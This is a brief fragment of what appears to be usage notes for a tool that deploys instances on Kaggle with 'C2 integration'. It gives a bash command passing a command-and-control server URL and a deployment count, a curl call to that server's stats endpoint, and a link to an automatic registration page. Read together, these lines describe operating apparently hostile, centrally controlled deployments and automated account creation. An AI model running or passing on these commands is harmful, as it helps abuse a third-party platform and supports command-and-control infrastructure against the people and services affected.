...
```bash
# With C2 integration
python3 kaggle/deploy_unified.py --c2-url https://gbctwoserver.pages.dev --count 5
...
# Server stats
curl https://gbctwoserver.pages.dev/api/stats
...
- Go to https://gbctwoserver.pages.dev/autoreg
